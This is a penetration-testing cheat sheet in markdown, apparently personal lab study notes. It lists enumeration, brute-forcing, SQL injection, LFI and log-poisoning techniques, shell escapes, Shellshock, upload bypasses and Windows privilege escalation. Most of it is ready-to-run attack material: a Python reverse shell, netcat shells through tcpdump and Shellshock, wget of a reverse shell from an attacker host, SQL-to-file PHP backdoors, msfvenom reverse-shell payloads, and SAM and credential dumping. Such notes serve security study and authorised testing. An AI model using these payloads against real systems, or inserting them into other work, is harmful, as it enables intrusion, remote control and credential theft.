# Awesome Pentest Notes

***

Table of Contents
=================
 * [Privilege Escalation](#-privilege-escalation)
 	* [Windows](#-Windows)
	* [Linux](#-Linux)
 * [Debugging](#-Debugging)
 * [Password Attacks](#-password-attacks)
 * [Buffer OverFlow](#-buffer-overflow)
 * [Service Scaning](#-Service-Scaning)
 * [Web App Scan](#-web-app-scan)
 * [Wordpress Attacks](#-Wordpress-Attacks)
 * [SQL Injection](#-SQL-Injection)
 * [RFI/LFI Technics](#-rfi-lfi)
 * [Shell Escaping and Spawning](#-Shell-Escaping-and-Spawning)
 * [Exploiting Shellshock](#-Exploiting-Shellshock)
 * [File Upload Bypass Technics](#-File-Upload-Bypass-Technics)
 * [Password Brute-forcing and Cracking](#-Password-Brute-forcing-and-Cracking)
 * [Metasploit Payloads](#-Metasploit-Payloads)
 * [Web Application Technics](#-Web-Application-Technics)
 * [Tcpdump](#-tcpdump)
 * [Windows Privileged Escalation Technics](#-Windows-Privileged-Escalation-Technics)
 * [Linux Privileged Escalation Technics](#-Linux-Privileged-Escalation-Technics)
 * [Usefull ](#-usefull-cmds)
 * [Unicode](#-Unicode)
 * [Pivoting](#-Pivoting)
 * [Tmux](#-Tmux)
 * [Misc](#-Misc)
 
 ## [↑](#table-of-contents) Privilege-Escalation
 #### [↑](#table-of-contents) Windows
 
 #### Misc
 - Testing credentials
   ```
   ldapwhoami -vvv -h 10.10.10.10 -p 389 -D user -x -w password
   
   .\PsExec64.exe \\dc1 /accepteula -u hack -p "PassW0rd!" -c cmd
   
   crackmapexec smb 10.10.10.1 -u Administrator -p "testpassword"
   
   ```
  - CMD net user
  	```
    whoami /groups
    whomai /priv
   
   
    net user user1
    net localgroup Adminisrators
    
    net user hack password /ADD /DOMAIN
    net group "Administrators"
    net localgroup "Administrators" hack /ADD /DOMAIN
  	```
    
- SMB Enum
  ```
  ^Listing shares
  smbmap -H 10.10.10.13
  smbmap -u "Anonymous" 10.10.10.13
  smbmap -u "DoesNotExit" 10.10.10.13

  ^Connect to shares
  smbclient -L //10.10.10.13
  smbclient -N //10.10.10.13/Backups

  ^Null session checks
  rpcclient -U "" 10.10.10.134
  echo "password" > rpcclient -U "user1" 10.10.10.10
  rpcclient $> enumdomusers

  ^Mounting shares
  mkdir /mnt/smb
  mount -t cifs //10.10.10.134/Backups /mnt/smb
  ```

- Windows Backup
```
^Mounting VHD
apt install libguestfs-tools
mkdir /mnt/vhd
guestmount --add xx.vhd --inspector --ro -v /mnt/vhd/
cd /mnt/vhd/
ls -la *
```

- Windows Hash
```
LM:NTLM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
aad3b >> blank password or account disabled
31d6c >> blank password or account disabled

Testing hash:
smbmap -u user -p hash:hash 10.x.x.x
```

- SAM Dump
```
cd Windows/System32/Config
cp SAM SYSTEM /box/dump/
cd /box/dump/
1) impactket-secretsdump -sam SAM -system SYSTEM local
2) samdump2 SAM SYSTEM
```

 ##### Mimikatz
 - PTH - Pass The Hash
   ```
   ```
 - PTT - Pass The Ticket
   ```
   ```
 - Dump Creds
   ```
   ```
 - DCSync
   ```
   ```
 - DCShadow
   ```
   ```

 ##### winPEAS
 ```
 ```
 ##### JAWE
 ```
 ```
 ##### WATSON
 ```
 ```
 ##### PowerLine
 ```
 ```
 
 ##### PowerUP
 ```
 ```
 ##### Metasploit 
 ```
 getsystem
 ```
 
 ##### BloodHound (SharpHound) 
 Gathering data from Remote Windows
 ```
 runas /users:test.local\user cmd
.\SharpHound.exe -c all -d test.local --domaincontroller 10.10.10.10 -v --SecureLDAP --IgnoreLdapCert
 ```
 Gathering data from Localhost using powershell version
 ```
 . .\SharpHound.ps1
 Invoke-BloodHound -CollectionMethod All -domaincontroller 10.10.10.10
 ```
 
 
 
 ##### Exploits
 EternalBlue
 ```
 ```
 
 Juicy Potato
 ```
 ```
 
 ##### Evil-Winrm
 
 ##### Impacket
 
 ```
 ./psexec.py 'Administrator:Password@10.10.10.134' cmd
 ./smbexec.py 'Administrator:Password@10.10.10.134' 
 ./wmiexec.py 'Administrator:Password@10.10.10.134' cmd
 ```
 
 ##### UAC Bypass
 
 ##### PowerShell Bypass
 ASMI
 
 Constrained Language 
 ```
 Using Powershell V2
 
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 2

 ```
 
 ```
 Check Powershell Language Mode
 
 $ExecutionContext.SessionState.LanguageMode
 ```
 
 ```
 PSByPassCLM
 
 https://github.com/padovah4ck/PSByPassCLM
 ```
 
 ##### File Transfer

 - ##### winrm
 
 - ##### Certutil
 	###### Upload
    ```
    certutil -encode \Users\Alfred\Downloads\backups\backup.zip c:\\Windows\\temp\\backup.b64
	type c:\\Windows\\temp\\backup.b64
    
	Copy base64 strings to kali
	Convert base64 back to original file
	base64 -d backup.b64 > backup.zip
	```
    
	###### Download
	```
    python -m SimpleHTTPServer 8888
	certutil.exe -urlcache -split -f http://10.10.14.3:8888/SharpHound/SharpHound.exe
	```
    
 - Impacket-smb
	```
 	```
 
 
 - Netcat
 	```
 	```
 
 - Metasploit Meterpreter shell
   ```
   ```
 
 
 
 #### [↑](#table-of-contents) Linux

 ## [↑](#table-of-contents) Debugging
 ```
 sudo apt-get install strace
 $ strace file

 sudo apt-get install ltrace
 $ ltrace file
 ```
 
 ## [↑](#table-of-contents) Password Attacks
 #### Brute forcing
 ```
 - Wordpress login
 wpscan –url http://10.11.1.234/wp-admin –wordlist /usr/share/wordlists/rockyou.txt –username admin
 
 - POP3
 hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V
 
 - SMTP
 hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V
 hydra -s 25 -v -V -l test@example.com -P /path/to/password/list.lst -t 1 -w 20 -f 192.168.10.5 smtp
 
 - SSH
 hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh
 hydra $ip -s 22 ssh -l <user> -P big\_wordlist.txt
 hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh
 
 - RDP
 hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
 
 - FTP 
 hydra -t 1 -l admin -P /root/Desktop/password.lst -vV $ip ftp
 
 - SNMP
 hydra -P password-file.txt -v $ip snmp
 
 - Online Cracking
 https://crackstation.net/*](https://crackstation.net
 
 ```
 ### Cracking
 ```
 ```
 
 ### Credential caching, Security Accounts Manager (SAM)
 ```
 pwdump.exe - Attempts to extract password hashes
 fgdump.exe - Attempts to kill local antiviruses before attempting to dump the password hashes and cached credentials.
 wce.exe - Allows one to perform several attacks to obtain clear text passwords and hashes
 ```
 
 ### Mimikatz
 ```
 # PTH - Pass the Hash
 # PTT - Pass the ticket
 # Silver Ticket
 # Golden Ticket
 # DCSync
 # DCshadow
 ```
 
 ## [↑](#table-of-contents) Buffer OverFlow
 #### Common Bad Characters
 ```
 0x00    NULL (\0)
 0x09    Tab (\t)
 0x20	 Spacebar
 0x0a    Line Feed (\n)
 0x0d    Carriage Return (\r)
 0xff    Form Feed (\f)

 ```

 ## [↑](#table-of-contents) Service Scaning
 ### Primarily Scaning
 ```
 
 ==
 ports=$(nmap -p- --min-rate=1000 -T5 10.10.10.75 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//);\
 nmap -sC -sV --script=vuln -p$ports 10.10.10.75
 ==
 
 $ export target=x.x.x.x
 
  Nmap top tcp ports
	 nmap -sT -Pn -sV -A --top-ports 100 10.11.1.73 -oN $target-top-port-tcp.nmap

 - Nmap full tcp ports
	 nmap -sT -Pn -sV -A -p 1-65535 10.11.1.73 -oN $target-full-tcp.nmap

 - Nmap top ucp ports 
	 nmap -sU -Pn -sV -A --top-ports 100 10.11.1.73 -oN $target-top-port-udp.nmap

 - Nmap full ucp ports
	 nmap -sU -Pn -sV -A -p 1-65535 10.11.1.73 -oN $target-full-udp.nmap
 ```
 ### Serivce Eunumuration 
 ```
 $ export target=x.x.x.x
 
 - SMB Enum
 nmap -sT -p 135,445 --script=*smb-vul*,*smb-enum* $target -oN $target-smb-enum.nmap
 nbtscan -r $ip/24
 nmblookup -A
	
	- SMTP Enum
 nmap -sT -p 25 --script=*smtp-ntlm*,*smtp-vul*,*smtp-enum* $target -oN $target-smtp-enum.nmap

	- RPC Enum
	nmap -sT -p 135 --script=*msrpc* 10.11.1.73 -oN $target-smtp-rpc.nmap
 
 - RDP Enum
 nmap -sT -p 3389 --script=rdp-enum-encryption.nse,rdp-vuln-ms12-020.nse $target -oN $target-rdp-enum.nmap
 
 - FTP Enum
	nmap -sT -p 21 --script=ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse $target -oN  $target-ftp-enum.nmap
 
 - TFTP Enum
 nmap -sU -p 69 --script=tftp-enum.nse $target -oN $target-tftp-enum.nmap

 - VNC Enum
 nmap -sU -p 5800,5900 --script=vnc-title.nse,vnc-info.nse,vnc-brute.nse $target -oN $target-vnc-enum.nmap
 
 - MySQL
 nmap -sT -p 3306 --script=mysql-vuln-cve2012-2122.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse $target -oN $target-mysql-enum.nmap
 nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip
 
 - SNMP
 nmap -sU -p 161 --script=snmp-info.nse 10.11.1.73 -oN $target-nsmp-enum.nmap
 snmpenum -t $ip
 snmpcheck -t $ip -c public

 echo public > community.txt; echo private >> community.txt
 for ip in $(seq 1 254);do echo 192.168.1.$ip;done > ip.txt
 onesixtyone -c community.txt -i ip.txt

 snmpwalk -v1 -cpublic 192.168.38.67
 snmpwalk -v1 -cpublic 10.11.1.128 .1.3.6.1.2.1.1.1.0
 
 1.3.6.1.2.1.25.1.6.0 System Processes
 1.3.6.1.2.1.25.4.2.1.2 Running Programs
 1.3.6.1.2.1.25.4.2.1.4 Processes Path
 1.3.6.1.2.1.25.2.3.1.4 Storage Units
 1.3.6.1.2.1.25.6.3.1.2 Software Name
 1.3.6.1.4.1.77.1.2.25 User Accounts
 1.3.6.1.2.1.6.13.1.3 TCP Local Ports
 
 - DNS
 dig a domain-name-here.com @nameserver #DNS IP lookup
 dig mx domain-name-here.com @nameserver#MX records lookup
 dig axfr domain-name-here.com @nameserver #DNS zone transfer
 nslookup -> set type=any -> ls -d blah.com #DNS zone transfer
 dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
 dnsrecon -d megacorpone.com -t axfr
 dnsenum zonetransfer.me
 
 host -t ns megacorpone.com #finding NS servers
 host -t mx megacorpone.com #finding mail server
 host -l megacorpone.com ns2.megacorpone.com #DNS zone transfer
 
 - Proxy test
 nikto -useproxy http://$ip:3128 -h $ip
 
 - Vulnerability Scan
 nmap -p1-65535 --script=*vul* --script-args=unsafe=1 $target -oN $target-vulns.nmap

 ```
 
 ## [↑](#table-of-contents) Web App Scan
 ```
 * Dirb
 >> Specifi file extention
 $ dirb http://10.10.10.56/cgi-bin -X .sh
 $ dirb http://$target /usr/share/wordlists/dirb/common.txt
 
 * Dirbuster
 $ dirbuster -u https://192.168.216.131 -H -v -l /usr/share/dirb/wordlists/common.txt

 * Nikto
 $ nikto -h http://pentest.local
 
 ** cmd.php
 

 ```
 ## [↑](#table-of-contents) Wordpress Attacks
 ```
 * WPScan
 $ wpscan –u http://derpnstink.local/weblog/ --enumerate t --enumerate u
 $ wpscan –random-agnet -u http://pentest.local –proxy 127.0.0.1:8080 
Note : Dont trust WPScan result, always check againts Searchsploit for all plugins

 
 ```
 ## [↑](#table-of-contents) SQL Injection
 ```
 ** Basic test
# ' OR 1=1 #
# admin' --
# admin' #
# admin'/*
# ' or 1=1--
# ' or 1=1#
# ' or 1=1/*
# ') or '1'='1--
# ') or ('1'='1--
 
 * SQLMAP Example - http://niiconsulting.com/checkmate/2014/01/from-sql-injection-to-0wnage-using-sqlmap/
 sqlmap -u 'http://helpdesk.test.lab/login.php' --data='username=username&password=password&submit=Enter' --level=5 --risk=3 --batch
sqlmap -u 'http://192.168.254.129:1337/978345210/index.php' --forms --level=5 --risk=3 --batch
 
 
 * xp_cmdshell
 http://192.168.1.66/showproduct.asp?id=1;exec master..xp_cmdshell 'ping 192.168.1.64';–
 
 
 * Enumerating the Database (manual)
    http://192.168.11.35/comment.php?id=738

    # Verbose error message?  
    http://$ip/comment.php?id=738 order by 1  
    http://$ip/comment.php?id=738 union all select 1,2,3,4,5,6

    # Determine MySQL Version:  
    http://$ip/comment.php?id=738 union all select
    1,2,3,4,@@version,6

    # current user being used for the database connection  
    http://$ip/comment.php?id=738 union all select
    1,2,3,4,user(),6 

    # we can enumerate database tables and column structures  
    http://$ip/comment.php?id=738 union all select
    1,2,3,4,table\_name,6 FROM information\_schema.tables 

    # target the users table in the database  
    http://$ip/comment.php?id=738 union all select
    1,2,3,4,column\_name,6 FROM information\_schema.columns where
    table\_name='users'  

    # extract the name and password  
    http://$ip/comment.php?id=738 union select
    1,2,3,4,concat(name,0x3a, password),6 FROM users  

    # Create a backdoor  
    http://$ip/comment.php?id=738 union all select 1,2,3,4,"<?php
    echo shell\_exec($\_GET\['cmd'\]);?>",6 into OUTFILE
    'c:/xampp/htdocs/backdoor.php'	
 
 ```
 
 ### Seletct in to Outfile (SQL to RCE)
 CREATE TABLE hacker(
 Stack TEXT
 ) ENGINE=MYSIaM;

 INSERT INTO hacker
 VALUES(
 '<?php echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; ?>'
 );

 SELECT *
 INTO DUMPFILE '/var/www/html/uploads/shell.php'
 FROM hacker;

 
  ## [↑](#table-of-contents) RFI/LFI Technics
  ### PROC Environment
  ```
  - /proc/self/environ 
  Inject HTTP_USER_AGENT as <?php system($_GET[‘cmd’]); ?> […]/fi/?page=/proc/self/environ&cmd=ls
  
  - /proc/self/fd 
  Inject HTTP_USER_AGENT as <?php system($_GET[‘cmd’]); ?> […]/fi/?page=/proc/self/fd&cmd=pwd
  ```
  
  ### PHP Wrapper
  ```
  - PHP://filter
  ?file=php://filter/read=convert.base64-encode/resource=../../config.php
  
  - Expect://
  ?page=expect://ls
  
  - Data://
  […]/fi/?page=data:text/plain,<?system($_GET['x']);?>&x=ls%00 […]/fi/?page=data:,<?system($_GET['cmd']);?>&x=ls%00 […]/fi/?page=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls%00
  
 
  ```
  ### PHP://input (POST method)
  ```
  - PHP://input (POST method)
  URL www.pentest.local/fileincl/vul.php?page=php://input 
  On Burp "Enable Post Data" <? system('wget http://kali/php-reverse-shell.php -O /var/www/shell.php')
  ```
  ### Log Poisoning to LFI
  ```
  - Inject PHP Shell to Apache log
  $ nc <target_ip> 80 GET /<?php system(&_GET['cmd']); ?> Browse to vulnerable page: […]/fi/?page=/var/log/apache.log&cmd=ls
  
  - Inject PHP Shell to Mail log
  $ mail -s "Hello: <?php system($_GET['cmd']); ?>" pentest@pentest.local < /dev/null 
  Browse to vulnerable page: […]/fi/?page=/var/log/mail.log&cmd=ls
  
  - Inject PHP Shell to SSH log
  $ ssh <? php system($_GET['cmd']);?>@<target_ip> Browse to vulnerable page: […]/fi/?page=/var/log/auth.log&cmd=ls
  ```
  ### Hiding PHP shell to an image and use for LFI
  ```
  Most of the time we cannot find anyway to upload .php directly to web server but if we can find the page that vulnerble for LFI then we can use the bypass method below to convert PHP shell to any images format and upload to the server and execute via LFI attack.


GIF : Add "GIF98a;" in the first line of the PHP shell then rename to shell.gif

GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>

JPG : cat orinal.jpg shell.php > shell.jpg

PNG  : cat orinal.png shell.php > shell.png

EXIF  : exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' shell.jpg
  ```
  
  ### Automatic Scaning tools
  ```
  - https://github.com/D35m0nd142/LFISuite
  - https://github.com/Hack-Hut/CrabStick
  ```
  
## [↑](#table-of-contents) Shell Escaping and Spawning
### Using Text Editor
```
VI --> :!bash
VI --> :set shell=/bin/bash:shell

VIM-->  !/bin/sh or !/bin/bash or vim -c '!sh'

Pico --> pico -s "/bin/bash" then you can write /bin/bash and then CTRL + T

Less --> less file then !sh

More --> more file then !sh
```
### Programing Languages Techniques
```
AWK --> awk 'BEGIN {system("/bin/bash")}'

Find --> find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;

Perl --> perl -e 'exec "/bin/bash";'

Python --> python -c ‘import pty; pty.spawn(“/bin/sh”)’
Python --> python -c ‘import pty; pty.spawn(“/bin/bash”)’

EXCEPT --> except spawn sh then sh

PHP --> php - a then exec("sh -i");

LUA --> os.execute('/bin/sh')

Ruby --> exec "/bin/sh"
```
### SSH Techniques
```
ssh username@IP -t "/bin/sh" or "/bin/bash"
ssh username@IP -t "bash --noprofile"
ssh username@IP -t "() { :; }; /bin/bash"
```
### Using other software
```
FTP --> !/bin/sh or !/bin/bash
SCP --> -S /path/yourscript x y:

GDB --> !/bin/sh or !/bin/bash

GIT --> git help status > you can run it then !/bin/bash
ZIP --> zip /tmp/test.zip /tmp/test -T --unzip -command="sh -c /bin/bash"

TAR --> tar cf /dev/null testfile --checkpoint=1 --checkpoint -action=exec=/bin/bash

NMAP --> nmap --interactive then !sh

MAN --> man man then !sh
```

### Spwaning
```
A tty is a regular terminal device (the console on your server). 
A pts is a psuedo terminal slave (an xterm or an ssh connection). 

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("$ip",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'

python -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo
export TERM=linux

echo os.system('/bin/bash')

/bin/sh -i

ssh user@localip 4444 -e /bin/sh 
ssh user@localip 4444 -e /bin/bash

Error "su : must be run from a terminal"
echo "import pty; pty.spawn('/bin/bash')" > /tmp/su.py
python /tmp/su.py

perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh"

ruby: exec "/bin/sh"

IRB : exec "/bin/sh

VI or VIM : 
:shell
:!bash
:set shell=/bin/bash:shell

NMAP
!sh

TCPDUMP
echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.test –Z root

lua: os.execute('/bin/sh')

```

## [↑](#table-of-contents) Exploiting Shellshock
###  Exploiting CGI-BIN
```
git clone https://github.com/nccgroup/shocker

./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c

/cgi-bin/status --verbose


SSH Forced Command

Check for forced command by enabling all debug output with ssh

$ ssh -vvv

$ ssh -i noob noob@$ip '() { :;}; /bin/bash'


cat file (view file contents)

echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {

:;}; echo \\$(</etc/passwd)\\r\\nHost:

vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80


Shell Shock run bind shell

echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {

:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:

vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
```


## [↑](#table-of-contents) File Upload Bypass Technics
### Null Character
```
Upload file as shell.php%00.jpg or shell.php%00.png
```
### Double Extension injection
```
Upload file as shell.php.png

In Burp - Change filename='shell.php'
```
### Content Type Manipulation
```
In Burp - Change Content-Type: image/png
```
### File Extension Manipulation
```
Using capital letters like : file.aSp or file.PhP or file.PHp3 file.PhP5 or file.PhT

Using trailing spaces and/or dots at the end of the filename like : file.asp… … . . .. .. , file.asp , file.asp.

Using semicolon bypass like : file.asp;.jpg (Only in IIS 6 or prior)

Using forbidden extension like :  file.asp:.jpg or file.asp::$data
```

 ## [↑](#table-of-contents) Password Brute-forcing and Cracking
 ### Medusa
 ```
 Medusa, initiated against an htaccess protected web directory
$ medusa -h $ip -u admin -P password-file.txt -M http -m DIR:/admin -T 10
 ```
 ### Hydra
 ```
 Brute-forcing against SNMP

$ hydra -P password-file.txt -v $ip snmp


Brute-forcing against FTP known user and password list

        $ hydra -t 1 -l admin -P /root/Desktop/password.lst -vV $ip ftp


SSH brute-forcing list of users and passwords

       $  hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh -s 22


POP3 Brute-forcing

$ hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V


SMTP Brute-forcing

$ hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V


Hydra attack http get 401 login with a dictionary

$ hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin


Brute-forcing Remote Desktop

$ hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip


Brute-forcing  HTTP login (POST method)

$ hydra -t2 -e ns -L users.txt -P passwords.txt -f 192.168.11.223 http-post-form "login.php:username=^USER^&password=^PASS^&submit=Login:Incorrect" -V

$ hydra -t64 -e ns -l administrator -P passwords.txt -f 192.168.11.223 http-post-form "login.php:username=^USER^&password=^PASS^&submit=Login:Incorrect" -V


Brute-forcing WordPress login

$ hydra -l elliot -P ~/password.txt 192.168.1.1 http-post-form "/wp-login.php:log=elliot&pwd=^PASS^:ERROR -V"
 ```
 ### John the Ripper
 ```
- Cracking Hashes
$ echo "admin:$P$B9wJdX0OkO95U2L.kqAWQXsFufw2p5N1" > admin_pass.txt
$ john adminpass.txt --wordlist=rockyou.txx
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash-here

- Cracking Linux password
$ unshadow passwd-file.txt shadow-file.txt
$ unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
$ john /tmp/crack.password.db
 ```
 ### Online Password Cracking site
 ```
 https://crackstation.net
 ```
 ### Ncrack
 ```
 - Brute-forcing RDP
$ ncrack -vv --user administrators -P password.txt rdp://$ip
 
 ```
 
 ### Hashcat
 
 ```
 $ echo "admin:$P$B9wJdX0OkO95U2L.kqAWQXsFufw2p5N1" > admin_pass.txt
 
 - Cracking Linux md5crypt passwords
 $ hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt

 - Cracking Wordpress passwords using rockyou:
 $ hashcat --force -m 400 -a 0 -o found1.txt --remove wphash.hash /usr/share/wordlists/rockyou.txt
 ```
 
  ## [↑](#table-of-contents) Metasploit Payloads
 ### Web Based Payloads
 ```
PHP
msfvenom -p php/meterpreter/reverse_tcp lhost=<Your IP> lport=<Your Port> -f raw > rshell.php

ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f asp > rshell.asp

JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f raw > rshell.jsp

WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f war > rshell.war


 ```
 
 ### Script Langauge payloads
 ```
Python

msfvenom -p cmd/unix/reverse_python LHOST=<Your IP> LPORT=<Your Port> -f raw > rshell.py
Bash

msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP> LPORT=<Your Port> -f raw > rshell.sh
Perl

msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP> LPORT=<Your Port> -f raw > rshell.pl
 ```
 ### Shellcode
 ```
Linux

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f <language>
Windows

msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f <language>


 ```
 ### Binaries
 ```
Linux

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f elf > rshell.elf
Mac

msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f macho > rshell.macho
Windows

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f exe > rshell.exe
 ```
 ### MSF Handlers
 ```
use exploit/multi/handler
set PAYLOAD <Payload name above>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z
 ```
 
  ## [↑](#table-of-contents) Web Application Technics
 ```
1. robots.txt

2. Source-code Review of Pages

3. Common backup files
/index.php.bak
/index.asp.bak
/index.htm.bak
/index.html.bak
/install.bak
/config.bak
/config.php.bak

4. Shellshock?
nmap -sV -p- --script http-shellshock <target>
nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>

5. HeartBleed?
nmap -sT -p 443 --script=ssl-heartbleed  <target>

6. Wordpress Scanning
$ wpscan –u http://pentest.local/weblog/ --enumerate t --enumerate u
$ wpscan –random-agnet -u http://pentest.local –proxy 127.0.0.1:8080
#Bruteforce WP login 
$ wpscan –url http://pentest.local/wp-admin –wordlist /usr/share/wordlists/rockyou.txt –username admin
Note : Dont trust WPScan result, always check againts Searchsploit for all plugins

7. Nikto
$ nikto -h http://www.pentest.local

8. Directory Bruteforcing :
$ dirbuster -u https://pentest.local -H -v -l /usr/share/dirb/wordlists/common.txt
$ dirb http://$pentest.local /usr/share/wordlists/dirbuster# directory-list-2.3-medium.txt -p $proxy-ip:3129
$ gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip
$ nikto -h http://www.pentest.local
 ```

  ## [↑](#table-of-contents) Tcpdump
 ```
 Filter by destination IP and ports

$ tcpdump -n "dst host 192.168.1.1 and dst port 23"
$ tcpdump -n "dst host 192.168.1.1 and (dst port 23 or dst port 443)"
$ tcpdump -n "dst net 192.168.10/24 and dst port 23"
$ tcpdump -n "dst net 192.168.10/24 and dst portrange 1-23"


Filter by source IP and ports

$ tcpdump -n "src host 192.168.1.1 and src port 2222"
$ tcpdump -n "src host 192.168.1.1 and (src port 2222 or src port 2200)"
$ tcpdump -n "src net 192.168.1.0/24 and src port 2222"
$ tcpdump -n "src net 192.168.1.0/24 and src portrange 1-2222"


Capture only ICMP packets:

$ tcpdump -v icmp


Capture either ICMP or ARP packets:

$ tcpdump -v "icmp or arp"


Grab a packet capture on port 80 (HTTP) and write to pcap file

$ tcpdump tcp port 80 -w output.pcap -i eth0


Display a captured pcap file

$ tcpdump -r captured.pcap
 ```

 ## [↑](#table-of-contents) Windows Privileged Escalation Technics
 ### Basic Enumeration command
 ```
 net config Workstation

systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

hostname

net users

ipconfig /all

route print

arp -A

netstat -ano

netsh firewall show state

netsh firewall show config

schtasks /query /fo LIST /v

tasklist /SVC

net start

DRIVERQUERY

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

dir /s *pass* == *cred* == *vnc* == *.config*

findstr /si password *.xml *.ini *.txt

reg query HKLM /f password /t REG_SZ /s

reg query HKCU /f password /t REG_SZ /s
 ```
 ### Credential store in files
 ```
  findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini

Credential store in DC Policy Script files (\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\)
 ```
### Credential store in registry
 ```
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s
 ```
 ### Cached credentials
 ```
meterpreter > load mimikatz
fgdump.exe
pwdump.exe
wce -w
gsecdump.exe -a
 ```
 ### Token kidnapping (churrasco.exe)
 ```
 Churrasco (Windows XP SP0 - SP1, Server 2003) - https://www.exploit-db.com/exploits/6705/
 
 cscript wget.vbs http://192.168.38.31/win/churrasco.exe churrasco.exe

 churrasco.exe "net user admin01 admin01/add"

 churrasco.exe "net localgroup administrators admin01/add"
 ```
 ### Domain Enumeration CMDs
 ```
 net user
 net user dan
 net group
 net user /domain
 net group /domain
 net group /domain "Domain Admins"
 net group /domain "Enterprise Admins"
 query user
 ```
 ### Group Policy Preferences (GPP)
 ```
 Check the password hash on \\dc1\SYSVOL\Groups.xml

 Decrypt the password as $gpp-decrypt hash
 ```
 ### Check on un-secured Schedule Tasks
 ```
 tasklist /SVC
 ```
 ### Metasploit (Rarely works)
 ```
 meterpreter > getsystem
 ```
 ### Finding vulnerable installed software
 ```
 CMD > wmic product get name,version
 PowerShell > Get-WmiObject Win32_Product | Sort-Objecct Name | Format-Table Name, Version, Vendor
 ```
 ### Unquoted Service Paths
 ```
 CMD > wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
 ```
 ### Pass-The-Ticket
 ```
 https://pentestlab.blog/tag/kiwi/
